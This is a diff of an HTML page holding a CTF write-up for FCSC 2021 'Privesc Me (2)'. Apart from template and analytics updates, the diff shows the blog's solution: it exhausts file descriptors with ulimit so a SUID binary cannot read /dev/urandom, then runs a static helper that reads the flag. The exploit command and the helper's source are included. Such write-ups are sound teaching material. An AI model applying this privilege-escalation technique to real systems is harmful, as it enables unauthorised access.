@@ -3,23 +3,21 @@
   <head>
     <title>[FCSC 2021 - misc] Privesc Me (2) - &#34;ALED&#34; - Your randomness checker // ret2school</title>
     <meta charset="utf-8" />
-    <meta name="generator" content="Hugo 0.80.0" />
+    <meta name="generator" content="Hugo 0.92.2" />
     <meta name="viewport" content="width=device-width, initial-scale=1" />
     <meta name="author" content="nasm" />
     <meta name="description" content="" />
     <link rel="stylesheet" href="https://ret2school.github.io/css/main.min.88e7083eff65effb7485b6e6f38d10afbec25093a6fac42d734ce9024d3defbd.css" />
 
     
-<script type="application/javascript">
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-8K5XT0SJN8"></script>
+<script>
 var doNotTrack = false;
 if (!doNotTrack) {
-	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
-	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
-	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
-	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
-	ga('create', 'G-8K5XT0SJN8', 'auto');
-	
-	ga('send', 'pageview');
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-8K5XT0SJN8', { 'anonymize_ip': false });
 }
 </script>
 
@@ -32,9 +30,10 @@ if (!doNotTrack) {
 <meta property="og:description" content="Privesc Me (2) - &ldquo;ALED&rdquo; - Your randomness checker (misc - 194 pts)  Le dernier stagiaire de l&rsquo;équipe nous a pondu un nouveau programme pour tester la robustesse des clés d&rsquo;authentification que notre administrateur système utilise. Son outil est disponible dans le dossier stage1. Le chef a poussé un soupir d&rsquo;agacement en voyant le code.
  I found this one pretty fun and I think it was my favorite along with &ldquo;It&rsquo;s mipsy router&rdquo;." />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://ret2school.github.io/post/privesc_two/" />
+<meta property="og:url" content="https://ret2school.github.io/post/privesc_two/" /><meta property="article:section" content="post" />
 <meta property="article:published_time" content="2021-05-03T00:00:00+00:00" />
 <meta property="article:modified_time" content="2021-05-03T00:00:00+00:00" />
+
 
 
   </head>
@@ -106,7 +105,7 @@ if (!doNotTrack) {
 </blockquote>
 <p>I found this one pretty fun and I think it was my favorite along with &ldquo;It&rsquo;s mipsy router&rdquo;.</p>
 <p>Once connected to the ssh, into the <code>stage1</code> folder, there are four files, <code>build.sh</code>, <code>flag.txt</code> (I wonder what that is), <code>stage1</code> (a SUID binary) and its source in <code>stage1.c</code>, here it is :</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;stdlib.h&gt;</span><span style="color:#ff79c6">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;stdlib.h&gt;</span><span style="color:#ff79c6">
 </span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;stdio.h&gt;</span><span style="color:#ff79c6">
 </span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;unistd.h&gt;</span><span style="color:#ff79c6">
 </span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;sys/types.h&gt;</span><span style="color:#ff79c6">
@@ -153,7 +152,7 @@ if (!doNotTrack) {
 <p>The <code>build.sh</code> file contains <code>gcc stage1.c -static -o stage1</code>. I guess the <code>-static</code> is here to prevent any <code>LD_PRELOAD</code>, that would be to easy. But this option gave me the idea for the exploit.</p>
 <p>By googling things like &ldquo;predict /dev/urandom ctf writeup&rdquo; I found several <a href="https://nickcano.com/pwnables-write-ups-oct17/">writeup</a>s on several similar challenges that were using <code>ulimit -f 0</code> in order to limit &ldquo;the maximum size of files created by the shell&rdquo; (- man). But the program here doesn&rsquo;t create any file to write the random content to it, but just reads from <code>/dev/urandom</code>. So we have to prevent it from reading from <code>urandom</code> to keep the <code>randomness</code> array filled with zeros. The <code>-n</code> option in the <code>ulimit</code> command allows to set a limit on the number of opened file descriptors.
 I modified the original source on my system to make it print when the file openings fail and where the comparaison fails :</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#8be9fd">int</span> <span style="color:#50fa7b">main</span>(<span style="color:#8be9fd">int</span> argc, <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">const</span> <span style="color:#ff79c6">*</span>argv[]) {
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#8be9fd">int</span> <span style="color:#50fa7b">main</span>(<span style="color:#8be9fd">int</span> argc, <span style="color:#8be9fd">char</span> <span style="color:#ff79c6">const</span> <span style="color:#ff79c6">*</span>argv[]) {
 
     <span style="color:#ff79c6">if</span>(argc <span style="color:#ff79c6">!=</span> <span style="color:#bd93f9">3</span>){
         printf(<span style="color:#f1fa8c">&#34;Usage : %s &lt;key file&gt; &lt;binary to execute&gt;&#34;</span>, argv[<span style="color:#bd93f9">0</span>]);
@@ -197,13 +196,13 @@ I modified the original source on my system to make it print when the file openi
 }
 </code></pre></div><p>Compile it with <code>gcc stage1.c -static -o stage1</code>.</p>
 <p>By running <code>ulimit -n 3 ; ./stage1 osef /bin/sh</code> locally, we get :</p>
-<pre><code>bash: start_pipeline : pgrp pipe: Trop de fichiers ouverts
+<pre tabindex="0"><code>bash: start_pipeline : pgrp pipe: Trop de fichiers ouverts
 key open failed
 /dev/urandom open failed                                                                                           
 Ok, well done
 /bin/sh: error while loading shared libraries: libc.so.6: cannot open shared object file: Error 24
 </code></pre><p>It says &ldquo;Ok, well done&rdquo; (nice) but also <code>/bin/sh: error while loading shared libraries: libc.so.6: cannot open shared object file: Error 24</code>. Yeah obviously, <code>sh</code> is cannot load any dynlib since it already has 3 file descriptors open (stdin, stdout and stderr). So either we recompile <code>/bin/sh</code> statically, which I didn&rsquo;t do, or we just make another program, statically linked, to read the flag for us. Here it is :</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;unistd.h&gt;</span><span style="color:#ff79c6">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;unistd.h&gt;</span><span style="color:#ff79c6">
 </span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;stdlib.h&gt;</span><span style="color:#ff79c6">
 </span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;stdio.h&gt;</span><span style="color:#ff79c6">
 </span><span style="color:#ff79c6">#include</span> <span style="color:#ff79c6">&lt;fcntl.h&gt;</span><span style="color:#ff79c6">
@@ -247,7 +246,7 @@ Ok, well done
 }
 </code></pre></div><p>It sets the soft limit of opened file descriptors to the maximum, that&rsquo;s why we need to use <code>-S</code> in the final exploit to set the soft limit instead of the default hard limit (which we can&rsquo;t increase afterwards).
 I compile this remotly and&hellip;</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ <span style="color:#8be9fd;font-style:italic">ulimit</span> -S -n <span style="color:#bd93f9">3</span> ; ./stage1 osef /tmp/yEyyy/exploit
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ <span style="color:#8be9fd;font-style:italic">ulimit</span> -S -n <span style="color:#bd93f9">3</span> ; ./stage1 osef /tmp/yEyyy/exploit
 -bash: start_pipeline: pgrp pipe: Too many open files
 Ok, well <span style="color:#ff79c6">done</span>
 Hard/soft limits : 3/1048576
